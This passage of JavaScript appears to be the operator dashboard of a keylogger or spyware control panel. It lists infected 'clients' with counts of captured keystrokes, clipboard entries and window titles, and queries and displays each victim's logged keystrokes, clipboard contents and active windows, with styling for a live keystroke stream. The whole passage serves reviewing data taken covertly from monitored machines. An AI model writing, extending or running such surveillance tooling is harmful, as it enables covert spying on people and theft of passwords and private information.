                    <input type="number" id="query-limit" value="100" min="1" max="1000">
                </div>
                <button class="btn-secondary" id="execute-query-btn">
                    <i class="fas fa-search"></i> Query Database
                </button>
                <button class="btn-secondary" id="refresh-clients-btn">
                    <i class="fas fa-sync-alt"></i> Refresh Client List
                </button>
            </div>
            <div class="query-results" id="query-results">
                <div class="empty-results">
                    <i class="fas fa-search"></i>
                    <p>Execute a query to see results</p>
                </div>
            </div>
        `;
        
        mainContent.appendChild(querySection);
        
        // Load clients into dropdown
        this.loadClientsForQuery();
        
        // Setup query button
        const queryBtn = document.getElementById('execute-query-btn');
        if (queryBtn) {
            queryBtn.addEventListener('click', () => this.executeDatabaseQuery());
        }
        
        // Setup refresh button
        const refreshBtn = document.getElementById('refresh-clients-btn');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', () => this.loadClientsForQuery());
        }
    }

    // Load clients for query dropdown
    async loadClientsForQuery() {
        const select = document.getElementById('query-client-select');
        if (!select) return;
        
        try {
            const response = await this.utils.apiCall('/api/clients/all');
            
            if (response.success && response.allClients) {
                select.innerHTML = '<option value="">Select a client...</option>';
                response.allClients.forEach(client => {
                    const option = document.createElement('option');
                    option.value = client.id;
                    option.textContent = `${client.id} (KS:${client.keystrokes || 0}, CB:${client.clipboard || 0}, W:${client.windows || 0})`;
                    select.appendChild(option);
                });
            }
        } catch (error) {
            console.error('Failed to load clients for query:', error);
            select.innerHTML = '<option value="">Error loading clients</option>';
        }
    }

    // Execute database query - FIXED FOR INDIVIDUAL DATA TYPES
    async executeDatabaseQuery() {
        const clientId = document.getElementById('query-client-select').value;
        const dataType = document.getElementById('query-data-type').value;
        const limit = parseInt(document.getElementById('query-limit').value) || 100;
        
        if (!clientId) {
            this.utils.showNotification('Please select a client', 'error');
            return;
        }
        
        try {
            this.utils.showNotification(`Querying ${dataType} for ${clientId}...`, 'info');
            
            // Map frontend types to backend API types
            const typeMap = {
                'keystrokes': 'ks',
                'clipboard': 'clip',
                'windows': 'win',
                'all': 'all'
            };
            
            const apiType = typeMap[dataType] || 'all';
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=${apiType}`);
            
            if (response.success) {
                // Process response to ensure consistent structure
                const processedResponse = this.processQueryResponse(dataType, response);
                this.displayQueryResults(clientId, dataType, processedResponse);
            } else {
                this.utils.showNotification('Query failed: ' + (response.error || 'Unknown error'), 'error');
            }
        } catch (error) {
            console.error('Database query failed:', error);
            this.utils.showNotification('Query failed: ' + error.message, 'error');
        }
    }

    // Process query response to ensure consistent structure
    processQueryResponse(dataType, response) {
        const processed = { ...response };
        
        // Ensure arrays exist even if empty
        if (dataType === 'all' || dataType === 'keystrokes') {
            if (!processed.keystrokes || !Array.isArray(processed.keystrokes)) {
                processed.keystrokes = [];
            }
        }
        
        if (dataType === 'all' || dataType === 'clipboard') {
            if (!processed.clipboard || !Array.isArray(processed.clipboard)) {
                processed.clipboard = [];
            }
        }
        
        if (dataType === 'all' || dataType === 'windows') {
            if (!processed.windows || !Array.isArray(processed.windows)) {
                processed.windows = [];
            }
        }
        
        return processed;
    }

    // Display query results
    displayQueryResults(clientId, dataType, response) {
        const resultsContainer = document.getElementById('query-results');
        if (!resultsContainer) return;
        
        let resultsHTML = `
            <div class="query-results-header">
                <h4>Results for ${clientId} (${dataType})</h4>
                <span class="results-count">
                    ${this.getResultsCount(response, dataType)} items found
                </span>
            </div>
        `;
        
        if (dataType === 'all' || dataType === 'keystrokes') {
            resultsHTML += this.formatQueryResults('Keystrokes', response.keystrokes || []);
        }
        
        if (dataType === 'all' || dataType === 'clipboard') {
            resultsHTML += this.formatQueryResults('Clipboard', response.clipboard || []);
        }
        
        if (dataType === 'all' || dataType === 'windows') {
            resultsHTML += this.formatQueryResults('Windows', response.windows || []);
        }
        
        resultsContainer.innerHTML = resultsHTML;
        this.utils.showNotification('Query completed successfully', 'success');
    }

    // Get results count
    getResultsCount(response, dataType) {
        let count = 0;
        if (dataType === 'all') {
            count += (response.keystrokes?.length || 0);
            count += (response.clipboard?.length || 0);
            count += (response.windows?.length || 0);
        } else if (dataType === 'keystrokes') {
            count = response.keystrokes?.length || 0;
        } else if (dataType === 'clipboard') {
            count = response.clipboard?.length || 0;
        } else if (dataType === 'windows') {
            count = response.windows?.length || 0;
        }
        return count;
    }

    // Format query results
    formatQueryResults(title, items) {
        if (!items.length) {
            return `
                <div class="result-section">
                    <h5>${title}</h5>
                    <div class="no-results">No ${title.toLowerCase()} found</div>
                </div>
            `;
        }
        
        let html = `
            <div class="result-section">
                <h5>${title} (${items.length})</h5>
                <div class="result-list">
        `;
        
        items.slice(0, 50).forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            
            if (title === 'Keystrokes') {
                html += `
                    <div class="result-item">
                        <span class="result-index">${index + 1}.</span>
                        <span class="result-time">[${time}]</span>
                        <span class="result-content">${this.escapeHtml(item.key || 'Unknown')}</span>
                    </div>
                `;
            } else if (title === 'Clipboard') {
                const content = item.content || 'Empty';
                const displayContent = content.length > 100 ? content.substring(0, 100) + '...' : content;
                html += `
                    <div class="result-item">
                        <span class="result-index">${index + 1}.</span>
                        <span class="result-time">[${time}]</span>
                        <span class="result-content" title="${this.escapeHtml(content)}">${this.escapeHtml(displayContent)}</span>
                    </div>
                `;
            } else if (title === 'Windows') {
                html += `
                    <div class="result-item">
                        <span class="result-index">${index + 1}.</span>
                        <span class="result-time">[${time}]</span>
                        <div class="result-content">
                            <div>${this.escapeHtml(item.title || 'Unknown')}</div>
                            <div class="result-process">${this.escapeHtml(item.process || 'Unknown')}</div>
                        </div>
                    </div>
                `;
            }
        });
        
        if (items.length > 50) {
            html += `<div class="result-more">... and ${items.length - 50} more items</div>`;
        }
        
        html += `
                </div>
            </div>
        `;
        
        return html;
    }

    // Utility function to escape HTML
    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Cleanup
    destroy() {
        this.stopAutoRefresh();
        this.stopLiveUpdates();
        
        // Clear all monitoring intervals
        this.activeClients.forEach((client, clientId) => {
            if (client.monitorInterval) {
                clearInterval(client.monitorInterval);
            }
        });
        
        console.log('🧹 Dashboard cleanup complete');
    }
}

// Add CSS for live streaming
const liveStreamStyles = document.createElement('style');
liveStreamStyles.textContent = `
    /* Live streaming styles */
    .live-indicator {
        display: flex;
        align-items: center;
        gap: 0.25rem;
        margin-top: 0.25rem;
    }
    
    .live-dot {
        width: 6px;
        height: 6px;
        border-radius: 50%;
        background: #34a853;
        animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.3; }
    }
    
    .live-text {
        font-size: 0.7rem;
        font-weight: 600;
        color: #34a853;
        text-transform: uppercase;
        letter-spacing: 0.05em;
    }
    
    .section-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 0.75rem;
    }
    
    .live-counter {
        font-size: 0.75rem;
        font-weight: 600;
        color: #1a73e8;
        background: #e8f0fe;
        padding: 0.125rem 0.5rem;
        border-radius: 12px;
        min-width: 24px;
        text-align: center;
    }
    
    .live-stream {
        min-height: 120px;
        max-height: 150px;
        overflow-y: auto;
    }
    
    .live-placeholder {
        color: #80868b;
        font-style: italic;
        text-align: center;
        padding: 2rem 1rem;
    }
    
    /* Keystroke animation */
    .new-keystroke {
        animation: slideIn 0.3s ease;
        background: #e8f0fe !important;
        transform-origin: left center;
    }
    
    @keyframes slideIn {
        from {
            opacity: 0;
            transform: translateX(-20px) scale(0.8);
        }
        to {
            opacity: 1;
            transform: translateX(0) scale(1);
        }
    }
    
    /* Query Section Styles */
    .query-form {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 1rem;
        margin-bottom: 1.5rem;
        padding: 1rem;
        background: #f8f9fa;
        border-radius: 6px;
        border: 1px solid #e0e0e0;
    }
    
    .form-group {
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .form-group label {
        font-size: 0.875rem;
        font-weight: 500;
        color: #5f6368;
    }
    
    .form-group select,
    .form-group input {
        padding: 0.5rem;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 0.875rem;
        background: white;
    }
    
    .query-results {
        background: white;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        padding: 1.5rem;
        max-height: 400px;
        overflow-y: auto;
    }
    
    .empty-results {
        text-align: center;
        padding: 2rem;
        color: #5f6368;
    }
    
    .empty-results i {
        font-size: 3rem;
        color: #dadce0;
        margin-bottom: 1rem;
    }
    
    .query-results-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid #e0e0e0;
    }
    
    .query-results-header h4 {
        margin: 0;
        font-size: 1rem;
        color: #202124;
    }
    
    .results-count {
        font-size: 0.875rem;
        color: #1a73e8;
        font-weight: 500;
    }
    
    .result-section {
        margin-bottom: 1.5rem;
    }
    
    .result-section:last-child {
        margin-bottom: 0;
    }
    
    .result-section h5 {
        font-size: 0.875rem;
        font-weight: 600;
        color: #5f6368;
        margin: 0 0 0.75rem 0;
        text-transform: uppercase;
        letter-spacing: 0.05em;
    }
    
    .result-list {
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .result-item {
        display: flex;
        align-items: flex-start;
        gap: 0.5rem;
        padding: 0.5rem;
        background: #f8f9fa;
        border-radius: 4px;
        border: 1px solid #e0e0e0;
        font-size: 0.875rem;
    }
    
    .result-index {
        color: #5f6368;
        min-width: 2rem;
        flex-shrink: 0;
    }
    
    .result-time {
        color: #80868b;
        font-size: 0.75rem;
        min-width: 6rem;
        flex-shrink: 0;
    }
    
    .result-content {
        flex: 1;
        word-break: break-all;
    }
    
    .result-process {
        font-size: 0.75rem;
        color: #5f6368;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    }
    
    .result-more {
        text-align: center;
        padding: 0.5rem;
        color: #5f6368;
        font-size: 0.75rem;
        font-style: italic;
    }
    
    .no-results {
        padding: 1rem;
        text-align: center;
        color: #5f6368;
        background: #f8f9fa;
        border-radius: 4px;
        border: 1px dashed #e0e0e0;
    }
    
    /* Data Modal Styles */
    .data-summary {
        display: flex;
        gap: 1rem;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid #e0e0e0;
    }
    
    .summary-item {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        padding: 0.5rem 1rem;
        background: #f8f9fa;
        border-radius: 4px;
        border: 1px solid #e0e0e0;
    }
    
    .summary-item i {
        color: #1a73e8;
    }
    
    .data-tabs {
        display: flex;
        gap: 0.5rem;
        margin-bottom: 1rem;
        border-bottom: 1px solid #e0e0e0;
        padding-bottom: 0.5rem;
    }
    
    .tab-btn {
        padding: 0.5rem 1rem;
        background: none;
        border: none;
        color: #5f6368;
        font-size: 0.875rem;
        cursor: pointer;
        border-radius: 4px;
        transition: all 0.2s ease;
    }
    
    .tab-btn:hover {
        background: #f8f9fa;
        color: #202124;
    }
    
    .tab-btn.active {
        background: #1a73e8;
        color: white;
    }
    
    .data-list {
        max-height: 300px;
        overflow-y: auto;
    }
    
    .data-item {
        display: flex;
        align-items: flex-start;
        gap: 0.5rem;
        padding: 0.75rem;
        border-bottom: 1px solid #f0f0f0;
    }
    
    .data-item:last-child {
        border-bottom: none;
    }
    
    .data-item:hover {
        background: #f8f9fa;
    }
    
    .data-index {
        color: #5f6368;
        min-width: 2rem;
        flex-shrink: 0;
    }
    
    .data-time {
        color: #80868b;
        font-size: 0.75rem;
        min-width: 6rem;
        flex-shrink: 0;
    }
    
    .data-content {
        flex: 1;
        word-break: break-all;
    }
    
    .clipboard-item .data-content {
        white-space: pre-wrap;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
        font-size: 0.8125rem;
        background: #f8f9fa;
        padding: 0.5rem;
        border-radius: 4px;
        border: 1px solid #e0e0e0;
    }
    
    .window-item .window-title {
        font-weight: 500;
        margin-bottom: 0.25rem;
    }
    
    .window-item .window-process {
        font-size: 0.75rem;
        color: #5f6368;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    }
    
    /* Loading states */
    .loading-keystrokes,
    .loading-windows,
    .loading-clipboard,
    .no-data {
        padding: 1rem;
        text-align: center;
        color: #5f6368;
        font-style: italic;
    }
    
    /* Disconnect button spacing */
    .client-status {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        flex-wrap: wrap;
    }
`;
document.head.appendChild(liveStreamStyles);

// Initialize dashboard
document.addEventListener('DOMContentLoaded', () => {
    if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
        window.dashboard = new Dashboard();
        window.dashboard.init();
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (window.dashboard) {
                window.dashboard.destroy();
            }
        });
    }
});